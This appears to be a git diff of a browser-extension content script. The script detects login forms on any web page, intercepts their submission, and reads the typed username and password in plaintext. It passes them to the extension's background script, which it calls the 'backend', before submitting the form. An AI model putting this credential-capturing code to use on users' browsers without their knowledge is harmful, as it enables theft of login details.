@@ -1,67 +1,7 @@
-// import browser from "webextension-polyfill";
-
-// export const loginScript = () => {
-
-// 	const forms = document.querySelectorAll<HTMLFormElement>("form");
-
-// 	if (forms.length > 0) {
-// 		forms.forEach((form) => {
-// 			form.addEventListener("submit", function () {
-// 				const username = form.querySelector<HTMLInputElement>(
-// 					'input[type="text"], input[type="email"]',
-// 				)?.value;
-
-// 				const password = form.querySelector<HTMLInputElement>(
-// 					'input[type="password"]',
-// 				)?.value;
-
-// 				if (username && password) {
-// 					// Send message to the background script
-
-// 					browser.runtime.sendMessage({
-// 						action: "credentialSubmit",
-// 						data: { username, password },
-// 					});
-// 				}
-// 			});
-// 		});
-// 	}
-
-// };
-
 // Improved Login Form Detection Script
 import browser from "webextension-polyfill";
 
 export const improvedLoginDetection = (): void => {
-	// Function to detect login forms based on advanced heuristics
-	function detectLoginForms(): void {
-		const forms = document.querySelectorAll("form");
-
-		forms.forEach((form) => {
-			if (isLoginForm(form)) {
-				console.log("Login form detected:", form);
-				attachFormListener(form);
-			}
-		});
-	}
-
-	// Function to determine if a form is a login form
-	function isLoginForm(form: HTMLFormElement): boolean {
-		const inputs = form.querySelectorAll("input");
-		let hasUsernameField = false;
-		let hasPasswordField = false;
-
-		inputs.forEach((input) => {
-			if (isPasswordField(input)) {
-				hasPasswordField = true;
-			} else if (isUsernameField(input)) {
-				hasUsernameField = true;
-			}
-		});
-
-		return hasPasswordField && (hasUsernameField || hasLoginIndicators(form));
-	}
-
 	// Function to check if an input is a password field
 	function isPasswordField(input: HTMLInputElement): boolean {
 		return (
@@ -129,23 +69,117 @@ export const improvedLoginDetection = (): void => {
 		);
 	}
 
+	function getCredentialFields(form: HTMLFormElement): {
+		usernameInput: HTMLInputElement | null;
+		passwordInput: HTMLInputElement | null;
+	} {
+		// Password field selector
+		const passwordSelectors = [
+			'input[type="password"]',
+			'input[name*="pass"]',
+			'input[id*="pass"]',
+			'input[aria-label*="Password"]',
+			'input[placeholder*="Password"]',
+		].join(", ");
+
+		const passwordInput = form.querySelector(
+			passwordSelectors,
+		) as HTMLInputElement | null;
+
+		// Username field selector
+		const usernameSelectors = [
+			'input:not([type="password"])[type="text"]',
+			'input[type="email"]',
+			'input[type="tel"]',
+			'input[name*="user"]',
+			'input[name*="email"]',
+			'input[id*="user"]',
+			'input[id*="email"]',
+			'input[aria-label*="Username"]',
+			'input[aria-label*="Email"]',
+			'input[placeholder*="Username"]',
+			'input[placeholder*="Email"]',
+			'input[autocomplete="username"]',
+			'input[autocomplete="email"]',
+		].join(", ");
+
+		// If there's a password field, look for the username field that comes before it
+		let usernameInput: HTMLInputElement | null = null;
+		if (passwordInput) {
+			const allInputs = Array.from(form.querySelectorAll("input"));
+			const passwordIndex = allInputs.indexOf(passwordInput);
+			const precedingInputs = allInputs.slice(0, passwordIndex);
+			usernameInput = precedingInputs
+				.reverse()
+				.find((input) =>
+					input.matches(usernameSelectors),
+				) as HTMLInputElement | null;
+		}
+
+		// If we didn't find a username input before the password field, look anywhere in the form
+		if (!usernameInput) {
+			usernameInput = form.querySelector(
+				usernameSelectors,
+			) as HTMLInputElement | null;
+		}
+
+		return { usernameInput, passwordInput };
+	}
+
 	// Function to attach event listener to the form
 	function attachFormListener(form: HTMLFormElement): void {
-		form.addEventListener("submit", (event) => {
-			event.preventDefault();
-			console.log("Login attempt detected at =>> ", window.location.href);
-			form.submit();
+		const { usernameInput, passwordInput } = getCredentialFields(form);
 
-			// 	browser.runtime.sendMessage({
-			// 		action: "loginAttempt",
-			// 		url: window.location.href
-			// 	}
-			// ).then(() => {
-			//	form.submit();
-			// 	}).catch((error) => {
-			// 		console.error("Error notifying background script:", error);
-			// 		form.submit();
-			// 	});
+		if (usernameInput && passwordInput) {
+			form.addEventListener("submit", async (event) => {
+				event.preventDefault();
+
+				const username = usernameInput.value;
+				const password = passwordInput.value;
+
+				if (username && password) {
+					try {
+						await browser.runtime.sendMessage({
+							action: "credentialSubmit",
+							data: { username, password },
+						});
+						console.log("Credentials sent to backend successfully");
+					} catch (error) {
+						console.error("Error sending credentials to backend:", error);
+						throw error;
+					} finally {
+						form.submit();
+					}
+				}
+			});
+		}
+	}
+
+	// Function to determine if a form is a login form
+	function isLoginForm(form: HTMLFormElement): boolean {
+		const inputs = form.querySelectorAll("input");
+		let hasUsernameField = false;
+		let hasPasswordField = false;
+
+		inputs.forEach((input) => {
+			if (isPasswordField(input)) {
+				hasPasswordField = true;
+			} else if (isUsernameField(input)) {
+				hasUsernameField = true;
+			}
+		});
+
+		return hasPasswordField && (hasUsernameField || hasLoginIndicators(form));
+	}
+	// Function to detect login forms based on advanced heuristics
+	function detectLoginForms(): void {
+		const forms = document.querySelectorAll("form");
+
+		forms.forEach((form) => {
+			if (isLoginForm(form)) {
+				console.log("Login form detected:", form);
+				attachFormListener(form);
+			}
 		});
 	}
 
